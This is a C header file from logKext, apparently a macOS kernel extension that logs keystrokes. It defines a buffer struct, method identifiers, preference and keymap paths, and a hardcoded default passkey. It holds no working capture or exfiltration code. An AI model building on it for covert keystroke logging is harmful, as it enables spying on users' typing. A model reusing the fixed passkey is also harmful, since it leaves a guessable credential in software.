/*
 *  logKextCommon.h
 *  logKext
 *
 *  Created by Braden Thomas on Thu Sep 30 2004.
 *
 */

#define MAX_BUFF_SIZE 1024

typedef struct {
	unsigned char buffer[MAX_BUFF_SIZE];
	unsigned int bufLen;
} bufferStruct;

enum {
	klogKextBuffandKeys,
	klogKextBuffer,
	kNumlogKextMethods
};

#define PREF_DOMAIN		 	 CFSTR("com.fsb.logKext")
#define DEFAULT_PASSKEY		"iea.i3nai!sf*saf"

#define KEXT_ID				"com.fsb.kext.logKext"
#define KEYMAP_PATH			"/Library/Preferences/logKextKeymap.plist"
//#define DEBUG